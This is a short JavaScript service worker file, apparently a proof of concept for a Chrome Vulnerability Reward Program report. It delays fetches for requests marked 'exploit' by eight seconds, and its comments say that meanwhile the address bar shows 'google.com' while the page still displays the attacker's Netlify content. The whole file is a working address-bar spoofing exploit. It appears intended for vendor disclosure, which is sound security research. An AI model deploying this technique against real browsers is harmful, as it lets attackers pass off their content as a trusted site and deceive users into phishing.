// sw.js - Chrome VRP Service Worker Delay
self.addEventListener('install', (event) => {
    self.skipWaiting();
});

self.addEventListener('activate', (event) => {
    event.waitUntil(clients.claim());
});

self.addEventListener('fetch', (event) => {
    const url = new URL(event.request.url);

    // If the request is for our target, hold the line
    if (url.searchParams.has('exploit')) {
        event.respondWith(
            new Promise((resolve) => {
                // We delay the actual fetch for 8 seconds.
                // During this time, the URL bar will show 'google.com'
                // while the screen stays on our Netlify content.
                setTimeout(() => {
                    resolve(fetch(event.request));
                }, 8000);
            })
        );
    }
});
